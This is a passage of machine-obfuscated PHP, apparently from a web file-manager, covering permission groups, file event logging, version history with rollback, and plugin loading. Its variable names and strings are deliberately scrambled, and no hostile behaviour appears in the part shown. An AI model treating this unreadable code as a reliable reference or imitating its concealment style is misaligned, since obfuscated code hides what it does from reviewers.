count($óê¯¨¼à) > $ €œş„) { $¥ïÒ’ƒé = array_reverse(array_slice($óê¯¨¼à, $ €œş„)); $œĞšú¬ş = array_search($æ²æ¶å, $¥ïÒ’ƒé); if ($œĞšú¬ş !== !1 && $œĞšú¬ş + 1 <= $„â˜Ï ) { $„â˜Ï  = $œĞšú¬ş + 1; } } } return $„â˜Ï ; } private function userGroupList($´¡Œ›Ä™ = false) { $œ¯Îˆì =& $_SERVER[ì™ı‰º¯]; static $ê»Ì°ÉÈ = array(); if (isset($ê»Ì°ÉÈ[$´¡Œ›Ä™])) { return $ê»Ì°ÉÈ[$´¡Œ›Ä™]; } $İ»ºü‘” = Model($œ¯Îˆì[525])->getInfo($´¡Œ›Ä™); $ê»Ì°ÉÈ[$´¡Œ›Ä™] = array_to_keyvalue($İ»ºü‘”[$œ¯Îˆì[2046]], $œ¯Îˆì[1859]); return $ê»Ì°ÉÈ[$´¡Œ›Ä™]; } public function userGroupParents($ªç˜Ë²ş) { $‚ËÙšåÑ =& $_SERVER[ì™ı‰º¯]; static $ÆÈéÖúø = array(); $ªç˜Ë²ş = $ªç˜Ë²ş ? $ªç˜Ë²ş : USER_ID; if (isset($ÆÈéÖúø[$ªç˜Ë²ş])) { return $ÆÈéÖúø[$ªç˜Ë²ş]; } $îô§Êö = $this->userGroupList($ªç˜Ë²ş); $”€˜İ€î = array(); $¨¢àÔÕû = $GLOBALS[$‚ËÙšåÑ[6]][$‚ËÙšåÑ[89]][$‚ËÙšåÑ[1962]] == 1; $ôÓÈ” = $¨¢àÔÕû ? 3 : 2; foreach ($îô§Êö as $Åµ”éıâ) { $»ØÖ¦Ì = array($Åµ”éıâ[$‚ËÙšåÑ[1859]]); $§ôí·åë = explode($‚ËÙšåÑ[50], trim($Åµ”éıâ[$‚ËÙšåÑ[511]], $‚ËÙšåÑ[50])); if ($§ôí·åë[0] == $‚ËÙšåÑ[198] && count($§ôí·åë) > $ôÓÈ”) { $ù³Í•İ´ = array_slice($§ôí·åë, $ôÓÈ”); $»ØÖ¦Ì = array_merge($»ØÖ¦Ì, array_reverse($ù³Í•İ´)); } $”€˜İ€î = array_merge($”€˜İ€î, $»ØÖ¦Ì); } $ÆÈéÖúø[$ªç˜Ë²ş] = array_unique($”€˜İ€î); return $ÆÈéÖúø[$ªç˜Ë²ş]; } public function authTargetInfoMake($¶„¦îØ”) { $ñŸ¸ğÙ‰ =& $_SERVER[ì™ı‰º¯]; $Çø°öÇŒ = array(); $ÍÑ¦Ôì = array(); foreach ($¶„¦îØ” as $Ìş…£Ã) { if ($Ìş…£Ã[$ñŸ¸ğÙ‰[411]] == SourceModel::TYPE_USER) { $Çø°öÇŒ[] = intval($Ìş…£Ã[$ñŸ¸ğÙ‰[496]]); } else { if ($Ìş…£Ã[$ñŸ¸ğÙ‰[411]] == SourceModel::TYPE_GROUP) { $ÍÑ¦Ôì[] = intval($Ìş…£Ã[$ñŸ¸ğÙ‰[496]]); } } } if ($Çø°öÇŒ) { $Çø°öÇŒ = Model($ñŸ¸ğÙ‰[504])->userListInfo($Çø°öÇŒ); } if ($ÍÑ¦Ôì) { $ÎÔÒŸßÒ = array($ñŸ¸ğÙ‰[1947] => array($ñŸ¸ğÙ‰[418], $ÍÑ¦Ôì)); $ÍÑ¦Ôì = Model($ñŸ¸ğÙ‰[512])->field($ñŸ¸ğÙ‰[2075])->where($ÎÔÒŸßÒ)->select(); $ÍÑ¦Ôì = array_to_keyvalue($ÍÑ¦Ôì, $ñŸ¸ğÙ‰[1859]); } return array($ñŸ¸ğÙ‰[2076] => $Çø°öÇŒ, $ñŸ¸ğÙ‰[2077] => $ÍÑ¦Ôì); } public function authInfo($ÓìÏœøá) { $›É—şåë =& $_SERVER[ì™ı‰º¯]; if ($ÓìÏœøá[$›É—şåë[1963]]) { $ŒÅŸ¸Ä¹ = Model($›É—şåë[498])->listData($ÓìÏœøá[$›É—şåë[1963]]); if (!$ŒÅŸ¸Ä¹) { return !1; $‚â¹¶à = Model($›É—şåë[498])->listData(); $«ó«“™æ = array_filter_by_field($‚â¹¶à, $›É—şåë[413], $›É—şåë[198]); return $«ó«“™æ; } $ùš¡İˆ¤ = array_field_key($ŒÅŸ¸Ä¹, array($›É—şåë[399], $›É—şåë[32], $›É—şåë[413], $›É—şåë[1882], $›É—şåë[1883])); $ùš¡İˆ¤[$›É—şåë[2078]] = $ÓìÏœøá; return $ùš¡İˆ¤; } else { return array($›É—şåë[419] => 0, $›É—şåë[1865] => $ÓìÏœøá[$›É—şåë[2023]], $›É—şåë[420] => $›É—şåë[12], $›É—şåë[1882] => $›É—şåë[2079]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\x75\x72\143\145\137\145\166\x65\156\164"; protected $dataAuto = array(array("\x63\162\x65\x61\164\145\124\151\155\x65", "\x74\x69\155\x65", "\151\156\x73\x65\162\x74", "\x66\165\156\143\x74\x69\157\156"), array("\144\x65\163\x63", '', "\x69\x6e\x73\145\162\164\x2c\165\160\x64\x61\x74\145\54\163\145\x6c\x65\x63\164", "\152\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Şƒ›Õ«â, $ãáğª¯‘, $åÁÀı¿’ = '') { $ºûå™Çö =& $_SERVER[ì™ı‰º¯]; if (!$this->eventSave) { return; } $ß¬âĞß° = Model($ºûå™Çö[1338])->sourceInfo($Şƒ›Õ«â); if (!$ß¬âĞß°) { return !1; } if ($this->isCacheEvent($ß¬âĞß°, $ãáğª¯‘)) { return; } if ($åÁÀı¿’ && is_string($åÁÀı¿’)) { $åÁÀı¿’ = array($ºûå™Çö[1898] => $åÁÀı¿’); } $ÇĞËØ©û = array($ºûå™Çö[417] => $Şƒ›Õ«â, $ºûå™Çö[2080] => $ß¬âĞß°[$ºûå™Çö[432]], $ºûå™Çö[2081] => $ß¬âĞß°[$ºûå™Çö[32]], $ºûå™Çö[509] => !empty($ß¬âĞß°[$ºûå™Çö[509]]) ? $ß¬âĞß°[$ºûå™Çö[509]] : $ºûå™Çö[12], $ºûå™Çö[1661] => USER_ID, $ºûå™Çö[422] => $ãáğª¯‘, $ºûå™Çö[1663] => $åÁÀı¿’); $this->addSystemLog($ãáğª¯‘, $ÇĞËØ©û); unset($ÇĞËØ©û[$ºûå™Çö[2081]], $ÇĞËØ©û[$ºûå™Çö[509]]); return $this->add($ÇĞËØ©û); } private function addSystemLog($Â¯°–ÉÚ, $½ğß×äË) { $ì§üÎüö =& $_SERVER[ì™ı‰º¯]; if ($Â¯°–ÉÚ == $ì§üÎüö[2082]) { $Â¯°–ÉÚ = $½ğß×äË[$ì§üÎüö[453]][$ì§üÎüö[2083]]; } else { if (in_array($Â¯°–ÉÚ, array($ì§üÎüö[1839], $ì§üÎüö[2084]))) { $Â¯°–ÉÚ = $½ğß×äË[$ì§üÎüö[453]][$ì§üÎüö[750]]; } } $Ü»£êÊ = array_merge($½ğß×äË, array($ì§üÎüö[2085] => $½ğß×äË[$ì§üÎüö[402]], $ì§üÎüö[2086] => $½ğß×äË[$ì§üÎüö[2086]])); Hook::trigger($ì§üÎüö[2087], $ì§üÎüö[2088] . $Â¯°–ÉÚ, $½ğß×äË); Model($ì§üÎüö[1803])->addLog($ì§üÎüö[2088] . $Â¯°–ÉÚ, $Ü»£êÊ); } private function isCacheEvent($¶ÖØÂ½ø, $ÕŠ°Š¦) { if ($¶ÖØÂ½ø[$_SERVER[ì™ı‰º¯][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ä…şòø°, $Œ€¾•§Á) { $µğÔ³”¹ =& $_SERVER[ì™ı‰º¯]; $ŠóËÁŠí = Model($µğÔ³”¹[1338])->sourceInfo($ä…şòø°); $œã¡Íá¼ = array($µğÔ³”¹[2083] => $Œ€¾•§Á, $µğÔ³”¹[32] => $ŠóËÁŠí[$µğÔ³”¹[32]]); return $this->addEvent($ä…şòø°, $µğÔ³”¹[2082], $œã¡Íá¼); } public function eventFileEdit($ÕëÊ©êÇ) { $¡šÕ­ƒÏ =& $_SERVER[ì™ı‰º¯]; $Äü´Õ»Ÿ = array($¡šÕ­ƒÏ[2089] => $_SERVER[$¡šÕ­ƒÏ[2090]], $¡šÕ­ƒÏ[2091] => strtolower(ACTION)); if (isset($GLOBALS[$¡šÕ­ƒÏ[7]][$¡šÕ­ƒÏ[2092]])) { $Äü´Õ»Ÿ[$¡šÕ­ƒÏ[2092]] = $¡šÕ­ƒÏ[88]; } return $this->addEvent($ÕëÊ©êÇ, $¡šÕ­ƒÏ[1829], $Äü´Õ»Ÿ); } public function eventRecycle($‰¸Ú¡¾, $Ø«ïØÂ) { return $this->addEvent($‰¸Ú¡¾, $_SERVER[ì™ı‰º¯][2084], $Ø«ïØÂ); } public function eventRemove($ğ“²êÉ) { $²ò´¹şƒ =& $_SERVER[ì™ı‰º¯]; $ı¾‚¥Ùõ = Model($²ò´¹şƒ[1338])->sourceInfo($ğ“²êÉ); $‰£Ó¾¼ = $ı¾‚¥Ùõ[$²ò´¹şƒ[32]]; return $this->addEvent($ı¾‚¥Ùõ[$²ò´¹şƒ[432]], $²ò´¹şƒ[1828], $‰£Ó¾¼); } public function eventShare($²Çüà£´, $å¢ÔĞ°¦) { return $this->addEvent($²Çüà£´, $_SERVER[ì™ı‰º¯][1839], $å¢ÔĞ°¦); } public function eventMove($‹®ÄèÚÃ, $Àï¶ø³, $‰ŒëÈ) { $‚œ‹°è =& $_SERVER[ì™ı‰º¯]; $…œÒ¸ = Model($‚œ‹°è[1338]); $ùœìÆ—Ï = $…œÒ¸->sourceInfo($‹®ÄèÚÃ); $¸ëòåğø = $…œÒ¸->sourceInfo($Àï¶ø³); $™‰¼¥¥ = $…œÒ¸->sourceInfo($‰ŒëÈ); $Âì°Â³° = array($‚œ‹°è[1159] => $Àï¶ø³, $‚œ‹°è[2093] => $¸ëòåğø[$‚œ‹°è[32]], $‚œ‹°è[2071] => !empty($¸ëòåğø[$‚œ‹°è[509]]) ? $¸ëòåğø[$‚œ‹°è[509]] : $‚œ‹°è[12], $‚œ‹°è[1160] => $‰ŒëÈ, $‚œ‹°è[2094] => $™‰¼¥¥[$‚œ‹°è[32]], $‚œ‹°è[2095] => !empty($™‰¼¥¥[$‚œ‹°è[509]]) ? $™‰¼¥¥[$‚œ‹°è[509]] : $‚œ‹°è[12]); $this->addEvent($‹®ÄèÚÃ, $‚œ‹°è[548], $Âì°Â³°); $ùœìÆ—Ï = $…œÒ¸->sourceInfo($‹®ÄèÚÃ); $Âì°Â³° = array($‚œ‹°è[402] => $ùœìÆ—Ï[$‚œ‹°è[402]], $‚œ‹°è[32] => $ùœìÆ—Ï[$‚œ‹°è[32]]); $this->addEvent($Àï¶ø³, $‚œ‹°è[2096], $Âì°Â³°); } public function eventCopy($¥²ç„íæ) { $this->eventCreate($¥²ç„íæ, $_SERVER[ì™ı‰º¯][546]); } public function eventRename($œåĞñÚõ, $“õÆ°°¢, $ÆéÂá¸ñ) { $‹»ÀÆÀØ =& $_SERVER[ì™ı‰º¯]; $ºšÍ¡çé = array($‹»ÀÆÀØ[1159] => $“õÆ°°¢, $‹»ÀÆÀØ[1160] => $ÆéÂá¸ñ); return $this->addEvent($œåĞñÚõ, $‹»ÀÆÀØ[1353], $ºšÍ¡çé); } public function eventAddComment($¾İÀ¿¼ë, $ƒ¢‘âŸâ) { return $this->addEvent($¾İÀ¿¼ë, $_SERVER[ì™ı‰º¯][2097], $ƒ¢‘âŸâ); } public function eventAddDesc($»®ûÒİÂ, $âÒäŒ„ƒ) { return $this->addEvent($»®ûÒİÂ, $_SERVER[ì™ı‰º¯][2098], $âÒäŒ„ƒ); } public function listBySource($¬£àó) { $®Ûˆ´Î’ =& $_SERVER[ì™ı‰º¯]; $ª·”ÍØÌ = Model($®Ûˆ´Î’[1338])->sourceInfo($¬£àó); $¸³á’Ü = array($®Ûˆ´Î’[417] => $¬£àó); if ($ª·”ÍØÌ[$®Ûˆ´Î’[410]] == $®Ûˆ´Î’[88]) { $ä‡âŞ¦ø = Model($®Ûˆ´Î’[1338])->listSearchChildren($¬£àó, 20000); $ä‡âŞ¦ø[] = $¬£àó . $®Ûˆ´Î’[378]; $¸³á’Ü = array($®Ûˆ´Î’[402] => array($®Ûˆ´Î’[7], $ä‡âŞ¦ø)); } $ŠÖ–ãËÄ = $this->where($¸³á’Ü)->order($®Ûˆ´Î’[2099])->selectPage(); if ($ŠÖ–ãËÄ[$®Ûˆ´Î’[366]][$®Ûˆ´Î’[367]] == 0) { $ŠÖ–ãËÄ[$®Ûˆ´Î’[366]][$®Ûˆ´Î’[367]] = 1; $ŠÖ–ãËÄ[$®Ûˆ´Î’[369]] = array(array($®Ûˆ´Î’[417] => $¬£àó, $®Ûˆ´Î’[2080] => $ª·”ÍØÌ[$®Ûˆ´Î’[432]], $®Ûˆ´Î’[1661] => $ª·”ÍØÌ[$®Ûˆ´Î’[454]], $®Ûˆ´Î’[422] => $®Ûˆ´Î’[2100], $®Ûˆ´Î’[423] => $ª·”ÍØÌ[$®Ûˆ´Î’[201]], $®Ûˆ´Î’[1663] => $®Ûˆ´Î’[12])); } return $this->eventListParse($ŠÖ–ãËÄ, $¬£àó); } private function eventListParse($áâ›’ä±, $²¾úõü®) { $³ó¥¢ëó =& $_SERVER[ì™ı‰º¯]; $¬ª¸ÄÒ = $áâ›’ä±[$³ó¥¢ëó[369]]; $êãò¸¦ = array_to_keyvalue($¬ª¸ÄÒ, $³ó¥¢ëó[12], $³ó¥¢ëó[402]); $•‚‡şË = array_to_keyvalue($¬ª¸ÄÒ, $³ó¥¢ëó[12], $³ó¥¢ëó[2086]); foreach ($¬ª¸ÄÒ as $¾…ˆßŸŒ) { $¤Æœ¸·¹ = $¾…ˆßŸŒ[$³ó¥¢ëó[453]]; if ($¾…ˆßŸŒ[$³ó¥¢ëó[33]] == $³ó¥¢ëó[548] && isset($¤Æœ¸·¹[$³ó¥¢ëó[1159]])) { $êãò¸¦[] = $¤Æœ¸·¹[$³ó¥¢ëó[1159]] . $³ó¥¢ëó[12]; $êãò¸¦[] = $¤Æœ¸·¹[$³ó¥¢ëó[1160]] . $³ó¥¢ëó[12]; } if ($¾…ˆßŸŒ[$³ó¥¢ëó[33]] == $³ó¥¢ëó[2096] && isset($¤Æœ¸·¹[$³ó¥¢ëó[402]])) { $êãò¸¦[] = $¤Æœ¸·¹[$³ó¥¢ëó[402]] . $³ó¥¢ëó[12]; } } $êãò¸¦ = array_merge($êãò¸¦, $•‚‡şË, array($²¾úõü® . $³ó¥¢ëó[12])); $êãò¸¦ = array_unique($êãò¸¦); $§¶šÁŒ… = array_unique(array_to_keyvalue($¬ª¸ÄÒ, $³ó¥¢ëó[12], $³ó¥¢ëó[1670])); $åã§Ÿïí = Model($³ó¥¢ëó[525])->userListInfo($§¶šÁŒ…); $ı®Œ ¨Ò = Model($³ó¥¢ëó[821])->sourceListInfo($êãò¸¦, !0); foreach ($¬ª¸ÄÒ as &$¾…ˆßŸŒ) { if ($¾…ˆßŸŒ[$³ó¥¢ëó[33]] == $³ó¥¢ëó[548] && isset($¾…ˆßŸŒ[$³ó¥¢ëó[453]][$³ó¥¢ëó[1159]])) { $¾…ˆßŸŒ[$³ó¥¢ëó[453]][$³ó¥¢ëó[1159]] = $ı®Œ ¨Ò[$¾…ˆßŸŒ[$³ó¥¢ëó[453]][$³ó¥¢ëó[1159]]]; $¾…ˆßŸŒ[$³ó¥¢ëó[453]][$³ó¥¢ëó[1160]] = $ı®Œ ¨Ò[$¾…ˆßŸŒ[$³ó¥¢ëó[453]][$³ó¥¢ëó[1160]]]; } if ($¾…ˆßŸŒ[$³ó¥¢ëó[33]] == $³ó¥¢ëó[2096] && isset($¾…ˆßŸŒ[$³ó¥¢ëó[453]][$³ó¥¢ëó[402]])) { $¾…ˆßŸŒ[$³ó¥¢ëó[453]][$³ó¥¢ëó[402]] = $ı®Œ ¨Ò[$¾…ˆßŸŒ[$³ó¥¢ëó[453]][$³ó¥¢ëó[402]]]; } $¾…ˆßŸŒ[$³ó¥¢ëó[87]] = $ı®Œ ¨Ò[$¾…ˆßŸŒ[$³ó¥¢ëó[402]]]; $¾…ˆßŸŒ[$³ó¥¢ëó[2101]] = $ı®Œ ¨Ò[$¾…ˆßŸŒ[$³ó¥¢ëó[2086]]]; if ($¾…ˆßŸŒ[$³ó¥¢ëó[33]] == $³ó¥¢ëó[1828]) { $¾…ˆßŸŒ[$³ó¥¢ëó[2101]] = $¾…ˆßŸŒ[$³ó¥¢ëó[87]]; $¾…ˆßŸŒ[$³ó¥¢ëó[2086]] = $¾…ˆßŸŒ[$³ó¥¢ëó[2101]][$³ó¥¢ëó[402]]; $¾…ˆßŸŒ[$³ó¥¢ëó[87]] = !1; $¾…ˆßŸŒ[$³ó¥¢ëó[402]] = $³ó¥¢ëó[12]; } $¾…ˆßŸŒ[$³ó¥¢ëó[2031]] = $åã§Ÿïí[$¾…ˆßŸŒ[$³ó¥¢ëó[1670]]]; } unset($¾…ˆßŸŒ); $áâ›’ä±[$³ó¥¢ëó[369]] = $¬ª¸ÄÒ; return $áâ›’ä±; } public function removeBySource($œ×ƒûš) { $»Ã±ı•ë = array($_SERVER[ì™ı‰º¯][417] => $œ×ƒûš); $this->where($»Ã±ı•ë)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\x72\x63\145\137\x68\x69\163\x74\157\162\x79"; public function historyCount($¸›õ«¿Ô) { $‡¨š•ÈÑ =& $_SERVER[ì™ı‰º¯]; if (!$¸›õ«¿Ô) { return array(); } if (is_string($¸›õ«¿Ô) || is_int($¸›õ«¿Ô)) { $¸›õ«¿Ô = array($¸›õ«¿Ô); } $—…äœù¯ = array($‡¨š•ÈÑ[402], $‡¨š•ÈÑ[1892] => $‡¨š•ÈÑ[491]); $ö¾¡Õ†  = array($‡¨š•ÈÑ[402] => array($‡¨š•ÈÑ[7], $¸›õ«¿Ô)); $İÈÚ„¿û = $this->field($—…äœù¯)->where($ö¾¡Õ† )->group($‡¨š•ÈÑ[402])->select(); return array_to_keyvalue($İÈÚ„¿û, $‡¨š•ÈÑ[402], $‡¨š•ÈÑ[491]); } public function addHistory($¸¸Ş«–, $›½Û ¾¸ = '') { $©ÒŞÎ™„ =& $_SERVER[ì™ı‰º¯]; $¹ºØÎ™Ü = array($©ÒŞÎ™„[417] => $¸¸Ş«–[$©ÒŞÎ™„[402]], $©ÒŞÎ™„[1661] => isset($¸¸Ş«–[$©ÒŞÎ™„[456]]) ? $¸¸Ş«–[$©ÒŞÎ™„[456]] : $¸¸Ş«–[$©ÒŞÎ™„[454]], $©ÒŞÎ™„[469] => $¸¸Ş«–[$©ÒŞÎ™„[468]], $©ÒŞÎ™„[545] => $¸¸Ş«–[$©ÒŞÎ™„[76]], $©ÒŞÎ™„[2102] => $›½Û ¾¸); if ($GLOBALS[$©ÒŞÎ™„[6]][$©ÒŞÎ™„[89]][$©ÒŞÎ™„[1216]] >= 1) { $this->historyAutoClear($¹ºØÎ™Ü[$©ÒŞÎ™„[402]]); $this->add($¹ºØÎ™Ü); } Hook::trigger($©ÒŞÎ™„[2103], $¹ºØÎ™Ü); Model($©ÒŞÎ™„[2104])->eventFileEdit($¸¸Ş«–[$©ÒŞÎ™„[402]]); } private function historyAutoClear($½¸Ø¢½Á) { $À¹œãâ =& $_SERVER[ì™ı‰º¯]; $Õó÷¶Üš = Model($À¹œãâ[766])->get($À¹œãâ[1238]); $í×‰ÑŒı = $GLOBALS[$À¹œãâ[6]][$À¹œãâ[89]][$À¹œãâ[1216]]; $Ó›Úéì° = $Õó÷¶Üš == $À¹œãâ[1239] ? min(5, $í×‰ÑŒı) : $í×‰ÑŒı; $Ó›Úéì° = $Ó›Úéì° <= 0 ? 0 : $Ó›Úéì° - 1; if ($Ó›Úéì° >= 500) { return; } $”’ƒ–êÑ = array($À¹œãâ[417] => $½¸Ø¢½Á); $¥ÇùÅ› = $this->field($À¹œãâ[2105])->where($”’ƒ–êÑ)->order($À¹œãâ[2099])->select(); if (!$¥ÇùÅ› || $Ó›Úéì° >= count($¥ÇùÅ›)) { return; } $÷ÍÖº„ä = array_to_keyvalue($¥ÇùÅ›, $À¹œãâ[12], $À¹œãâ[399]); $÷ÍÖº„ä = array_slice($÷ÍÖº„ä, $Ó›Úéì°); $âË×ãÊ = array_to_keyvalue($¥ÇùÅ›, $À¹œãâ[12], $À¹œãâ[468]); $âË×ãÊ = array_slice($âË×ãÊ, $Ó›Úéì°); if (!$÷ÍÖº„ä || !$âË×ãÊ) { return; } $”’ƒ–êÑ = array($À¹œãâ[419] => array($À¹œãâ[7], $÷ÍÖº„ä)); $this->where($”’ƒ–êÑ)->delete(); Model($À¹œãâ[471])->remove($âË×ãÊ); } public function listData($„ãí°ı·) { $äŞ” =& $_SERVER[ì™ı‰º¯]; $‰¼åï¶µ = array($äŞ”[417] => $„ãí°ı·); $™„Æ¨ù÷ = $äŞ”[2106]; $ğØá„ø = $this->field($™„Æ¨ù÷)->where($‰¼åï¶µ)->order($äŞ”[2099])->selectPage(); $this->_listAppendUser($ğØá„ø[$äŞ”[369]]); $¤¾úæ• = Model($äŞ”[766])->get($äŞ”[1238]); $œ¥ÄÙèÈ = 5; if ($¤¾úæ• == $äŞ”[1239]) { $ğØá„ø[$äŞ”[369]] = array_slice($ğØá„ø[$äŞ”[369]], 0, $œ¥ÄÙèÈ); $ğØá„ø[$äŞ”[366]] = array($äŞ”[2107] => 1, $äŞ”[2108] => 20, $äŞ”[2109] => 1, $äŞ”[2110] => count($ğØá„ø[$äŞ”[369]])); } return $ğØá„ø; } protected function _listAppendUser(&$êÀ±¿¯) { $´öì‘Äƒ =& $_SERVER[ì™ı‰º¯]; $Óˆ—†Å = array_to_keyvalue($êÀ±¿¯, $´öì‘Äƒ[12], $´öì‘Äƒ[1670]); $™º“É¥ß = Model($´öì‘Äƒ[525])->userListInfo($Óˆ—†Å); foreach ($êÀ±¿¯ as &$«÷ñÄãÁ) { $ÜÜèÖØ  = $«÷ñÄãÁ[$´öì‘Äƒ[1670]]; $«÷ñÄãÁ[$´öì‘Äƒ[454]] = $™º“É¥ß[$ÜÜèÖØ ] ? $™º“É¥ß[$ÜÜèÖØ ] : !1; } unset($«÷ñÄãÁ); } public function fileInfo($îæ®³) { $÷ç‹¨€’ =& $_SERVER[ì™ı‰º¯]; $Ëì†¸¯¢ = $this->tablePrefix; $Ş½®ú®ì = "{$Ëì†¸¯¢}\x69\x6f\x5f\146\x69\x6c\145\x20\146\x69\154\x65\163\40\x6f\156\x20\x66\151\x6c\145\163\x2e\x66\151\154\145\111\104\x20\x3d\x20\150\x69\163\164\x6f\162\171\56\146\x69\154\145\111\104"; return $this->alias($÷ç‹¨€’[2111])->where(array($÷ç‹¨€’[419] => $îæ®³))->join($Ş½®ú®ì, $÷ç‹¨€’[2112])->find(); } public function removeItem($Ï¤¶Öæ¹) { $šÖ›Ù¤© =& $_SERVER[ì™ı‰º¯]; $óªß†  = array($šÖ›Ù¤©[419] => $Ï¤¶Öæ¹); $ĞĞÀÁÇ§ = $this->where($óªß† )->find(); if ($ĞĞÀÁÇ§) { $şï¿äÑß = $this->where($óªß† )->delete(); Model($šÖ›Ù¤©[471])->remove($ĞĞÀÁÇ§[$šÖ›Ù¤©[468]]); return $şï¿äÑß; } return !1; } public function removeBySource($»´Ñ®ŒÀ) { $’–±ş· =& $_SERVER[ì™ı‰º¯]; if (!$»´Ñ®ŒÀ) { return !1; } if (!is_array($»´Ñ®ŒÀ)) { $»´Ñ®ŒÀ = array($»´Ñ®ŒÀ); } $Éôİæ¡Ë = array($’–±ş·[417] => array($’–±ş·[7], $»´Ñ®ŒÀ)); $Ã–ëÈ»Û = $this->field($’–±ş·[469])->where($Éôİæ¡Ë)->select(); if ($Ã–ëÈ»Û) { $this->where($Éôİæ¡Ë)->delete(); $¤Ç—¡Øµ = array_to_keyvalue($Ã–ëÈ»Û, $’–±ş·[12], $’–±ş·[468]); Model($’–±ş·[471])->remove($¤Ç—¡Øµ); } return !0; } public function setDetail($â£åÓ¡, $­ÌıØúß) { $°æûÃÖ =& $_SERVER[ì™ı‰º¯]; return $this->where(array($°æûÃÖ[419] => $â£åÓ¡))->save(array($°æûÃÖ[2102] => $­ÌıØúß)); } public function rollbackToItem($ıš„¶¾, $ÎÛğÔñ¾) { $äõŞûÀ‰ =& $_SERVER[ì™ı‰º¯]; $²²ÆªÀ = Model($äõŞûÀ‰[821])->sourceInfo($ıš„¶¾); $this->addHistory($²²ÆªÀ, LNG($äõŞûÀ‰[2113])); $‰¾ğ­Ÿƒ = $this->find($ÎÛğÔñ¾); $„€Ïáï« = array($äõŞûÀ‰[468] => $‰¾ğ­Ÿƒ[$äõŞûÀ‰[468]], $äõŞûÀ‰[76] => $‰¾ğ­Ÿƒ[$äõŞûÀ‰[76]], $äõŞûÀ‰[85] => time(), $äõŞûÀ‰[456] => USER_ID); Model($äõŞûÀ‰[821])->where(array($äõŞûÀ‰[402] => $ıš„¶¾))->save($„€Ïáï«); return $this->where(array($äõŞûÀ‰[419] => $ÎÛğÔñ¾))->delete(); } public function clearSame($ô‚…Ë) { $ï²¯Úâ‚ =& $_SERVER[ì™ı‰º¯]; $€â¥Ğ˜ = $this->listData($ô‚…Ë); $èÌ«”•è = array_to_keyvalue_group($€â¥Ğ˜, $ï²¯Úâ‚[468]); $‰†­éúê = array(); $ÈçØœŒ = array(); foreach ($èÌ«”•è as $çê³ª…µ) { if (!$çê³ª…µ || count($çê³ª…µ) <= 1) { continue; } foreach ($çê³ª…µ as $±¸äá) { $‰†­éúê[] = $±¸äá[$ï²¯Úâ‚[468]]; $ÈçØœŒ[] = $±¸äá[$ï²¯Úâ‚[399]]; } } if (!$ÈçØœŒ) { return; } $this->where(array($ï²¯Úâ‚[399] => array($ï²¯Úâ‚[7], $ÈçØœŒ)))->delete(); Model($ï²¯Úâ‚[471])->remove($‰†­éúê); } public function userSpace() { $îø ¨²Ğ =& $_SERVER[ì™ı‰º¯]; $îĞÈÄ§ù = $this->tablePrefix; $Ë¶·üÃ¬ = array($îø ¨²Ğ[1661] => USER_ID); $Ïüº‹Çİ = "{$îĞÈÄ§ù}\151\x6f\137\x66\151\154\145\40\146\x69\x6c\x65\x73\x20\157\x6e\x20\146\x69\x6c\145\163\56\146\x69\154\145\111\x44\40\75\x20\150\151\x73\x74\157\x72\x79\56\x66\x69\154\x65\x49\104"; return $this->alias($îø ¨²Ğ[2111])->where($Ë¶·üÃ¬)->join($Ïüº‹Çİ, $îø ¨²Ğ[2112])->sum($îø ¨²Ğ[76]); } } goto dŞŸÍ…øğ£; c“ìÏØ‘ğ: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\160\154\165\147\151\x6e\114\151\163\x74"; public $field = array("\x6e\141\x6d\x65", "\163\164\141\x74\165\163", "\x72\145\x67\151\x65\x73\x74", "\143\x6f\x6e\x66\151\147"); public function loadList($Ü¹Ç£ïÉ = false) { $¥Ûëû = array_to_keyvalue($this->listData(), $_SERVER[ì™ı‰º¯][32]); if ($Ü¹Ç£ïÉ) { return $¥Ûëû[$Ü¹Ç£ïÉ]; } return $¥Ûëû; } public function init() { $ÆúÔÀÄŒ =& $_SERVER[ì™ı‰º¯]; Hook::trigger($ÆúÔÀÄŒ[1979]); $ßÌÇÌÓË = $this->loadPluginList(); foreach ($ßÌÇÌÓË as $Ÿ¦ÉÆ‚Õ => $ÏåÈÃ¦ï) { $ì»òÒ•® = $this->appAllow($Ÿ¦ÉÆ‚Õ, $ÏåÈÃ¦ï); if (!$ì»òÒ•®) { continue; } foreach ($ÏåÈÃ¦ï[$ÆúÔÀÄŒ[1980]] as $¹Ùç„éŒ => $‹ö½ëÂÅ) { Hook::bind($¹Ùç„éŒ, $‹ö½ëÂÅ); } } Hook::trigger($ÆúÔÀÄŒ[1981]); Hook::trigger(ACTION); } public function appAllow($àà‘°±©, $ª”‡Ì‚, $‹«Ìú¢© = true) { $Ÿ†…–³Ê =& $_SERVER[ì™ı‰º¯]; $˜à‚„Êñ = PLUGIN_DIR . $àà‘°±© . $Ÿ†…–³Ê[1982]; if (!is_array($ª”‡Ì‚) || !is_array($ª”‡Ì‚[$Ÿ†…–³Ê[1980]]) || $ª”‡Ì‚[$Ÿ†…–³Ê[745]] != 1 || !is_file($˜à‚„Êñ)) { return !1; } if ($GLOBALS[$Ÿ†…–³Ê[494]] == 1) { if ($GLOBALS[$Ÿ†…–³Ê[6]][$Ÿ†…–³Ê[1983]] || !$GLOBALS[$Ÿ†…–³Ê[6]][$Ÿ†…–³Ê[1984]]) { return !0; } $¨Ó»Îğ = explode($Ÿ†…–³Ê[50], strtolower($GLOBALS[$Ÿ†…–³Ê[6]][$Ÿ†…–³Ê[1984]])); return in_array(strtolower($àà‘°±©), $¨Ó»Îğ) ? !1 : !0; } if ($‹«Ìú¢© && !Action($Ÿ†…–³Ê[1985])->checkAuth($àà‘°±©)) { return !1; } return !0; } public function unInstall($Æû ÈØ«) { $³É…Ø›ë =& $_SERVER[ì™ı‰º¯]; $Û¶æº = $this->loadList($Æû ÈØ«); if (file_exists(PLUGIN_DIR . $Æû ÈØ«)) { Hook::apply($Æû ÈØ« . $³É…Ø›ë[1986]); } $this->remove($Û¶æº[$³É…Ø›ë[399]]); } public function changeStatus($µÍÄ…¥, $Ìø¡İñ) { $ãÀÁ¾‡ä =& $_SERVER[ì™ı‰º¯]; $Ë„æÀÒÎ = $this->loadList($µÍÄ…¥); if ($Ìø¡İñ) { Hook::apply($µÍÄ…¥ . 